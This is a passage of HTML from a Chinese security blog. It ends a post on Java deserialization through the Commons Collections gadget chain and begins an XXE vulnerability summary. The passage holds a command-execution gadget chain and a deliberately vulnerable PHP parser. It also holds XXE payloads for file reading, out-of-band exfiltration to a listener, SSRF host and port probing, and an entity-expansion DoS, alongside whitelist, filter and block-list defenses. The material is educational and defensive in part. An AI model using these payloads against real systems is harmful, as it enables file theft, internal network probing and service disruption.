ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>成员变量memberValues是Map类型，readObject()函数中对memberValues的每一项都调用了setValue函数，（setVaule会调用checkSetValue，checkSetValue会调用transform()）。所以我们就可以使用前面构造的Map来构造AnnotationInvocationHandler，在进行序列化时 执行AnnotationInvocationHandler中重写的readObject方法，对value值进行修改，触发对应的transform链(执行命令)。</p>
</blockquote>
<h3 id="TransformedMap与AnnotationInvocationHandler"><a href="#TransformedMap与AnnotationInvocationHandler" class="headerlink" title="TransformedMap与AnnotationInvocationHandler"></a>TransformedMap与AnnotationInvocationHandler</h3><p>想要调用未包含的package中的构造函数，只能通过反射的方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br></pre></td></tr></table></figure></p>
<p>且根据AnnotationInvocationHandler中readObject():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String var6 = (String)var5.getKey();</span><br><span class="line">Class var7 = (Class)var3.get(var6);</span><br><span class="line">if (var7 != null) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们可知道条件是var5与var7不能为null，var3是Retention，查看下Retention的成员，发现只有一个value，那么var5只需要put一个键为字符串”value”，Value不为annotation的实例化对象即可(可以为任意String字符串与Integer对象))<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-03-27.16.42.14-image.png" alt="2019-03-27.16.42.14-image.png"></p>
<p>使用TransformedMap与AnnotationInvocationHandler类触发反序列化漏洞时的大致步骤:</p>
<blockquote>
<ul>
<li>使用ConstantTransformer与InvokerTransformer构造一个Transformer数组（指定需要执行的代码）</li>
<li>将第一步得到的数组转化为ChainedTransformer调用链</li>
<li>使用decorate方法创建数组outmap，参数为非空Map对象(map)与上一步得到的ChainedTransformer对象</li>
<li>使用Java反射机制创建AnnotationInvocationHandler对象，构造函数指定数组(outmap)</li>
<li>对AnnotationInvocationHandler进行序列化，发送给Java中间件</li>
<li>Java中间件在对AnnotationInvocationHandler进行反序列化时，调用其中重写的readObject方法，对传入的参数Map进行setValue操作，触发漏洞，调用ConstantTransformer与InvokerTransformer指定的任意代码</li>
</ul>
</blockquote>
<p>总结:            </p>
<blockquote>
<p>攻击者将构造好的包含攻击代码的序列化数据发送给使用了Apache Commons Collections等危险组件的Java中间件时，Java中间件在对其进行反序列化操作时，触发反序列化漏洞，执行攻击者构造的任意代码</p>
</blockquote>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><h4 id="搜索危险库"><a href="#搜索危险库" class="headerlink" title="搜索危险库"></a>搜索危险库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">common-logging 1.2</span><br><span class="line">common-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure>
<h4 id="搜索危险函数"><a href="#搜索危险函数" class="headerlink" title="搜索危险函数"></a>搜索危险函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject		</span><br><span class="line">ObjectInputStream.readUnshared</span><br><span class="line">XMLDecoder.readObject	</span><br><span class="line">Yaml.load</span><br><span class="line">Json.parseObject</span><br><span class="line">XStream.fromXML</span><br></pre></td></tr></table></figure>
<h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><p><a href="https://xz.aliyun.com/t/2041#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/2041#toc-6</a><br>黑盒测试中，可通过抓包检测请求中可能存在的序列化数据(通常以AC ED开头 之后为两个字节的版本号0005 或者是base64编码后的rO0AB)<br>将序列化数据用<a href="https://github.com/NickstaDB/SerialBrute/" target="_blank" rel="noopener">SerialBrute.py脚本</a>处理后插入我们的payload</p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><h4 id="重写resolveClass来检验反序列化的类"><a href="#重写resolveClass来检验反序列化的类" class="headerlink" title="重写resolveClass来检验反序列化的类"></a>重写resolveClass来检验反序列化的类</h4><p>在readObject反序列化时首先会调用resolveClass读取反序列化的类名，所以我们可以通过重写ObjectInputStream对象的resolveClass方法即可实现对反序列化的校验。可以白名单检验:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class AntObjectInputStream extends ObjectInputStream&#123;</span><br><span class="line">    public AntObjectInputStream(InputStream inputStream) throws IOException&#123;</span><br><span class="line">        super(inputStream);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    只允许反序列化User class</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">        if(!desc.getName().equals(User.class))&#123;</span><br><span class="line">            throw new InvalidClassException(&quot;Unauthorized&quot;,</span><br><span class="line">                    desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        return super.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用ObjectInputFilter来校验反序列化的类"><a href="#使用ObjectInputFilter来校验反序列化的类" class="headerlink" title="使用ObjectInputFilter来校验反序列化的类"></a>使用ObjectInputFilter来校验反序列化的类</h4><p>Java9支持序列化数据过滤的新特性，开发人员继承java.io.ObjectInputFilter类重写checkInput()实现自定义的过滤器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.util.List;</span><br><span class="line">import java.util.Optional;</span><br><span class="line">import java.util.function.Function;</span><br><span class="line">import java.io.ObjectInputFilter;</span><br><span class="line">class BikeFilter implements ObjectInputFilter &#123;</span><br><span class="line">	private long maxStreamBytes = 78; // Maximum allowed bytes in the stream.</span><br><span class="line">	private long maxDepth = 1; // Maximum depth of the graph allowed.</span><br><span class="line">	private long maxReferences = 1; // Maximum number of references in a graph.</span><br><span class="line">	@Override</span><br><span class="line">	public Status checkInput(FilterInfo filterInfo) &#123;</span><br><span class="line">		if (filterInfo.references() &lt; 0 || filterInfo.depth() &lt; 0 || filterInfo.streamBytes() &lt; 0 || filterInfo.references() &gt; maxReferences || filterInfo.depth() &gt; maxDepth|| filterInfo.streamBytes() &gt; maxStreamBytes) &#123;</span><br><span class="line">			return Status.REJECTED;</span><br><span class="line">		&#125;</span><br><span class="line">		Class&lt;?&gt; clazz = filterInfo.serialClass();</span><br><span class="line">		if (clazz != null) &#123;</span><br><span class="line">			if (SerialObject.class == filterInfo.serialClass()) &#123;</span><br><span class="line">				return Status.ALLOWED;</span><br><span class="line">			&#125;</span><br><span class="line">			else &#123;</span><br><span class="line">				return Status.REJECTED;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return Status.UNDECIDED;</span><br><span class="line">	&#125; // end checkInput</span><br><span class="line">&#125; // end class BikeFilter</span><br></pre></td></tr></table></figure></p>
<p>只允许反序列化SerialObject类对象。</p>
<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><h4 id="禁止JVM执行外部命令"><a href="#禁止JVM执行外部命令" class="headerlink" title="禁止JVM执行外部命令"></a>禁止JVM执行外部命令</h4><p>通过扩展SecurityManager来禁止执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager originalSecurityManager = System.getSecurityManager();</span><br><span class="line">        if (originalSecurityManager == null) &#123;</span><br><span class="line">            // 创建自己的SecurityManager</span><br><span class="line">            SecurityManager sm = new SecurityManager() &#123;</span><br><span class="line">                private void check(Permission perm) &#123;</span><br><span class="line">                    // 禁止exec</span><br><span class="line">                    if (perm instanceof java.io.FilePermission) &#123;</span><br><span class="line">                        String actions = perm.getActions();</span><br><span class="line">                        if (actions != null &amp;&amp; actions.contains(&quot;execute&quot;)) &#123;</span><br><span class="line">                            throw new SecurityException(&quot;execute denied!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    // 禁止设置新的SecurityManager，保护自己</span><br><span class="line">                    if (perm instanceof java.lang.RuntimePermission) &#123;</span><br><span class="line">                        String name = perm.getName();</span><br><span class="line">                        if (name != null &amp;&amp; name.contains(&quot;setSecurityManager&quot;)) &#123;</span><br><span class="line">                            throw new SecurityException(&quot;System.setSecurityManager denied!&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                @Override</span><br><span class="line">                public void checkPermission(Permission perm) &#123;</span><br><span class="line">                    check(perm);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                @Override</span><br><span class="line">                public void checkPermission(Permission perm, Object context) &#123;</span><br><span class="line">                    check(perm);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            System.setSecurityManager(sm);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="禁止一些危险类"><a href="#禁止一些危险类" class="headerlink" title="禁止一些危险类"></a>禁止一些危险类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.collections.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections.functors.InstantiateTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InvokerTransformer</span><br><span class="line">org.apache.commons.collections4.functors.InstantiateTransformer</span><br><span class="line">org.codehaus.groovy.runtime.ConvertedClosure</span><br><span class="line">org.codehaus.groovy.runtime.MethodClosure</span><br><span class="line">org.springframework.beans.factory.ObjectFactory</span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.commons.beanutils</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/xiohao/p/4234184.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiohao/p/4234184.html</a><br><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">https://paper.seebug.org/312/</a><br><a href="http://www.vuln.cn/6296" target="_blank" rel="noopener">http://www.vuln.cn/6296</a><br><a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">https://xz.aliyun.com/t/3847</a><br><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/97</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                //ConstantTransformer类的transform()方法：将待转化的对象变为一个常量</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line"></span><br><span class="line">                //InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</span><br><span class="line">                //当改变value时 触发InvokerTransformer的transformer方法</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class,</span><br><span class="line">                        Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class&#125;,</span><br><span class="line">                        new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //transformers数组 ChainedTransformer按顺序调用一系列的变换</span><br><span class="line">        Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map normalMap = new HashMap();</span><br><span class="line">        normalMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line"></span><br><span class="line">        //TransformedMap(map, keyTransformer, valueTransformer)</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(normalMap, null, transformedChain);</span><br><span class="line">        Map.Entry entry = (Map.Entry) transformedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;1111&quot;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/27/xxe/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="P0rZ9">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="P0rZ9's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/02/27/xxe/" itemprop="url">XXE漏洞总结</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-27T08:15:41+08:00">
                2019-02-27
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>以前对于XXE了解较少,为了弥补安全防御知识及减少漏洞利用短板,翻了一波资料,总结分享下。</p>
</blockquote>
<hr>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>xml基础知识:<a href="https://p0rz9.github.io/2018/11/08/java_web_xml/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/11/08/java_web_xml/</a><br><strong>DTD</strong>:<br>XML文档包括XML声明,DTD文档类型定义(可选),文档元素。        </p>
<pre><code>内部声明DTD:    
    &lt;!DOCTYPE 根元素 [元素声明]&gt;

引用外部DTD:
    &lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;
</code></pre><p>DTD中的关键字:            </p>
<pre><code>DOCTYPE(声明)    
ENTITY(实体声明)        
SYSTEM PUBLIC(外部资源申请)            
</code></pre><p>实体类别:</p>
<pre><code>参数实体(用%声明,用%引用。 DTD中声明,DTD中引用)            
其余实体(直接用实体名称声明,使用&amp;引用。  DTD中声明,xml中引用)                
</code></pre><p><strong>举例</strong></p>
<pre><code>内部实体:            
&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;    

外部实体:
&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;        

参数实体:
&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;    
或
&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;
</code></pre><p>注:参数实体是在<strong>DTD中</strong>引用的,而其余实体是在<strong>xml文档</strong>中引用的。        </p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>xml外部实体注入(XML External Entity)。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
<h3 id="构建外部实体注入"><a href="#构建外部实体注入" class="headerlink" title="构建外部实体注入"></a>构建外部实体注入</h3><p>构建外部实体注入共有3种方法    </p>
<h4 id="有回显读本地敏感文件-Normal-XXE"><a href="#有回显读本地敏感文件-Normal-XXE" class="headerlink" title="有回显读本地敏感文件(Normal XXE)"></a>有回显读本地敏感文件(Normal XXE)</h4><p>xml.php</p>
<pre><code>&lt;?php
    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents(&apos;php://input&apos;);
    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;
?&gt;
</code></pre><p>payload:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [ 
    &lt;!ENTITY b SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt; 
]&gt;
&lt;c&gt;&amp;b;&lt;/c&gt;
</code></pre><p>结果如下<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.36.44-image.png" alt="2019-02-27.08.36.44-image.png"></p>
<p>上面可以读取到数据是基于文件内容没有什么特殊符号,我们新建个test.txt文件,复制刚才的内容,再加上几个<code>&lt; &gt;</code>符号(<strong>如下所示</strong>)                </p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-26.18.07.59-image.png" alt="2019-02-26.18.07.59-image.png"></p>
<p><strong>我们读取一下</strong>:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.08.44.59-image.png" alt="2019-02-27.08.44.59-image.png"></p>
<p>发现报错了,因为txt文件的&lt;字符会被xml解析器当作新元素的开始,那如何解决这个问题,我们需要了解一下:<a href="http://www.w3school.com.cn/xml/xml_cdata.asp" target="_blank" rel="noopener">CDATA</a></p>
<blockquote>
<p>CDATA指的是不应由XML解析器进行解析的文本数据。CADATA中的所有内容都会被XML解析器忽略。</p>
</blockquote>
<p>那在这里我们就可以把读出来的数据放在CDATA中输出进行绕过。由于在XML并不支持多个实体连续引用,而必须在<strong>DTD中拼接好</strong>，然后在XML中进行引用。在DTD中拼接，只能使用参数实体，payload:</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   
&lt;!ENTITY % goodies SYSTEM &quot;file:///C:/Windows/test.txt&quot;&gt;  
&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  
&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:83/evil.dtd&quot;&gt; 
%dtd; ]&gt; 

&lt;roottag&gt;&amp;all;&lt;/roottag&gt;
</code></pre><p>evil.dtd</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;
</code></pre><p>成功读取到含有特殊字符的文件内容<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.11.59-image.png" alt="2019-02-27.09.11.59-image.png"></p>
<h4 id="无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="无回显读取本地敏感文件(Blind OOB XXE)"></a>无回显读取本地敏感文件(Blind OOB XXE)</h4><h5 id="外带请求读取文件"><a href="#外带请求读取文件" class="headerlink" title="外带请求读取文件"></a>外带请求读取文件</h5><p>想要外带就必须发出请求，我们可以在外部实体定义或者参数实体定义时，但是光请求还不够，我们需要把第一次请求的数据传出去，就是说，我们需要在”<strong>请求中引用另一个请求的结果</strong>“，我们只有用参数实体才可以满足要求(且参数实体必须在DTD中引用)</p>
<p>xml.php</p>
<pre><code>&lt;?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents(&apos;php://input&apos;);
$dom = new DOMDocument();
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?&gt;
</code></pre><p>evil.dtd</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/Windows/test.txt&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://127.0.0.1:1223?p=%file;&apos;&gt;&quot;&gt;
</code></pre><p>payload:</p>
<pre><code>http://127.0.0.1:83/xml.php
post:
&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:83/evil.dtd&quot;&gt;
%remote;%int;%send;
]&gt;
</code></pre><p>我们先监听1223端口,然后执行我们的payload，执行结果:</p>
<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.45.31-image.png" alt="2019-02-27.09.45.31-image.png"></p>
<p>我们可以看到接收了我们base64编码(为了不破坏原来的XML语法)后的文件内容,我们解码后即为test.txt内容<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.09.51.44-image.png" alt="2019-02-27.09.51.44-image.png"></p>
<p>调用过程:<br>在payload中看到连续调用了三个请求实体%remote;%int;%send;,首先%remote先调用,调用后请求83端口的evil.dtd文件，然后%int调用test.dtd中的%file,%file就会去获取服务器上的test.txt文件，然后将返回的结果进行base64编码再填充到%send中(实体内容不能有%,所以进行html编码为<code>&amp;#37;</code>)，调用%send，将内容发到我们监听的服务器上(这里我用本机演示的)，这就实现了外带数据的效果，解决了XXE无回显的问题。</p>
<h3 id="XXE的危害"><a href="#XXE的危害" class="headerlink" title="XXE的危害"></a>XXE的危害</h3><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>这是XXE攻击最基本的使用方式,我们在上面的例子可以看到。        </p>
<h4 id="SSRF-内网主机、端口探测"><a href="#SSRF-内网主机、端口探测" class="headerlink" title="SSRF/内网主机、端口探测"></a>SSRF/内网主机、端口探测</h4><p>SSRF(服务器请求伪造)，<br>利用SSRF,我们可以使用更多的协议来进行漏洞测试,我们先了解不同平台对应可用的协议:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.11.27.49-image.png" alt="2019-02-27.11.27.49-image.png"></p>
<p>PHP在安装扩展以后还能支持以下协议:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.11.44.51-image.png" alt="2019-02-27.11.44.51-image.png"></p>
<p><strong>主机探测</strong></p>
<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
    &lt;!DOCTYPE ANY [
        &lt;!ENTITY f SYSTEM &quot;http://10.10.10.1&quot;&gt;
    ]&gt;
    &lt;x&gt;&amp;f;&lt;/x&gt;
</code></pre><p>对ip地址进行探测或者使用FTP协议探测(下文会提及)</p>
<p><strong>端口探测</strong><br>由上面知道了网端的开放信息,接下来我们就进一步探测存活网段的端口:</p>
<pre><code>&lt;?xml version = &quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
    &lt;!ENTITY f SYSTEM &quot;http://127.0.0.1:80&quot;&gt;
]&gt;
&lt;x&gt;&amp;f;&lt;/x&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-02-27.12.12.06-image.png" alt="2019-02-27.12.12.06-image.png"></p>
<h4 id="Dos攻击"><a href="#Dos攻击" class="headerlink" title="Dos攻击"></a>Dos攻击</h4><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
  &lt;!DOCTYPE lolz [
    &lt;!ENTITY lol &quot;lol&quot;&gt;
    &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
    &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
    &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
    &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
    &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
    &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
